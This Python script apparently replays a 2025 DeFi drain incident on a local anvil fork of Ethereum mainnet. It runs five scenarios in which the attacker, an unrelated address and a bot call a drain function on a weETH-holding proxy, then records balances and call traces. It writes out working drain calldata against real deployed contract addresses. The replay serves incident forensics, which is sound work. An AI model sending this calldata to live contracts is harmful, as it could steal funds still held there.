"""Local-fork replay for neemo-2025 (nothing broadcast). Start: anvil --fork-url https://eth.drpc.org --fork-block-number 22855568 --port 18568 --auto-impersonate --no-rate-limit
   then from project root: .venv/bin/python incidents/neemo-2025/scripts/replay_local_fork.py  -> incidents/neemo-2025/attacker_replay_local_fork.json
Scenarios A-E: attacker EOA calls 03b79c24; unrelated address calls it; bot calldata replayed; attacker real selector sequence; attacker call after the bot."""
import json, urllib.request, sys
URL="http://127.0.0.1:18568"
def rpc(m,p=None):
    req=urllib.request.Request(URL,data=json.dumps({"jsonrpc":"2.0","id":1,"method":m,"params":p or []}).encode(),headers={"Content-Type":"application/json"})
    j=json.load(urllib.request.urlopen(req,timeout=120))
    if "error" in j: raise RuntimeError(j["error"])
    return j["result"]
PROXY="0x54cd23460df45559fd5feeaada7ba25f89c13525"
ATT="0x7e9b11d0aa215e0f1a7f62534c7c93fc340d493d"
BOT="0xb750e3165de458eae09904cc7fad099632860b0f"
ROUTER="0x1a61249f6f4f9813c55aa3b02c69438607272ed3"
WEETH="0xcd5fe23c85820f7b72d0926fc9b05b43e359b7ee"
RAND="0x00000000000000000000000000000000c0ffee01"  # arbitrary fresh address (placeholder, not an entity)
BOTIN=json.load(open("data/raw/rpc/tx_0xa57ec56af91ec70517ca71ca50101958d9c2ec9fdb61edcf35a9081c375725c2.json")); BOTIN=BOTIN.get("result",BOTIN)["input"]
def bal(a): return int(rpc("eth_call",[{"to":WEETH,"data":"0x70a08231"+"0"*24+a[2:]},"latest"]),16)
def send(frm,to,data,label):
    rpc("anvil_setBalance",[frm,hex(10**20)])
    tr=rpc("debug_traceCall",[{"from":frm,"to":to,"data":data,"gas":hex(1500000)},"latest",{"tracer":"callTracer"}])
    h=rpc("eth_sendTransaction",[{"from":frm,"to":to,"data":data,"gas":hex(1500000),"maxFeePerGas":hex(10**9),"maxPriorityFeePerGas":hex(10**9)}])
    import time
    r=None
    for _ in range(40):
        r=rpc("eth_getTransactionReceipt",[h])
        if r: break
        time.sleep(0.5)
    try: tr=rpc("debug_traceTransaction",[h,{"tracer":"callTracer"}])
    except Exception as e: tr["_note"]="traceTransaction failed; traceCall used: "+str(e)[:80]
    return {"label":label,"from":frm,"to":to,"input":data,"tx":h,"status":int(r["status"],16),"gasUsed":int(r["gasUsed"],16),"trace":tr}
def flat(n,d=0,out=None):
    out=[] if out is None else out
    out.append({"depth":d,"type":n["type"],"from":n["from"],"to":n.get("to"),"input":n.get("input","")[:10]+("…" if len(n.get("input",""))>10 else ""),"input_full":n.get("input"),"value":n.get("value"),"error":n.get("error")})
    for c in n.get("calls",[]) or []: flat(c,d+1,out)
    return out
res={}
def scenario(name,fn):
    rpc("anvil_reset",[{"forking":{"jsonRpcUrl":"https://eth.drpc.org","blockNumber":22855568}}])
    rpc("evm_setNextBlockTimestamp",[1751749415])
    res[name]=fn()
SEL="0x03b79c24"
def A():
    pre=bal(PROXY); t=send(ATT,PROXY,SEL+"0"*24+ATT[2:],"attacker EOA calls 03b79c24(attacker)")
    return {"proxy_weETH_before":pre,"proxy_weETH_after":bal(PROXY),"attacker_weETH_after":bal(ATT),"tx":{k:v for k,v in t.items() if k!="trace"},"calls":flat(t["trace"])}
def Bq():
    pre=bal(PROXY); t=send(RAND,PROXY,SEL+"0"*24+RAND[2:],"unrelated fresh address calls 03b79c24(self)")
    return {"proxy_weETH_before":pre,"proxy_weETH_after":bal(PROXY),"caller_weETH_after":bal(RAND),"tx":{k:v for k,v in t.items() if k!="trace"},"calls":flat(t["trace"])}
def C():
    pre=bal(PROXY); t=send(BOT,ROUTER,BOTIN,"bot's exact calldata replayed at state after block 22855568")
    return {"proxy_weETH_before":pre,"proxy_weETH_after":bal(PROXY),"bot_eth_balance_delta_wei":None,"tx":{k:v for k,v in t.items() if k!="trace"},"calls":flat(t["trace"])}
def D():
    out=[]
    for lab,data in (("53474b2c()","0x53474b2c"),("97e44edc(attacker)","0x97e44edc"+"0"*24+ATT[2:]),("03b79c24(attacker)",SEL+"0"*24+ATT[2:])):
        pre=bal(PROXY); 
        try: t=send(ATT,PROXY,data,"attacker sequence: "+lab)
        except Exception as e: out.append({"label":lab,"error":str(e)}); continue
        out.append({"label":lab,"proxy_weETH_before":pre,"proxy_weETH_after":bal(PROXY),"attacker_weETH_after":bal(ATT),"status":t["status"],"gasUsed":t["gasUsed"],"calls":flat(t["trace"])})
    return out
def E():
    send(BOT,ROUTER,BOTIN,"bot drain")
    pre=bal(PROXY); t=send(ATT,PROXY,SEL+"0"*24+ATT[2:],"attacker calls 03b79c24(attacker) AFTER the bot drain")
    return {"proxy_weETH_before":pre,"proxy_weETH_after":bal(PROXY),"attacker_weETH_after":bal(ATT),"tx":{k:v for k,v in t.items() if k!="trace"},"calls":flat(t["trace"])}
for n,f in (("A_attacker_calls_drain",A),("B_unrelated_address_calls_drain",Bq),("C_bot_calldata_replay",C),("D_attacker_actual_selector_sequence",D),("E_attacker_drain_after_bot",E)):
    scenario(n,f); print(n,"ok")
res["_meta"]={"fork_url":"https://eth.drpc.org","fork_block":22855568,"note":"local anvil fork only; nothing broadcast; fresh address 0x..c0ffee01 is an arbitrary placeholder"}
json.dump(res,open("incidents/neemo-2025/attacker_replay_local_fork.json","w"),indent=1)
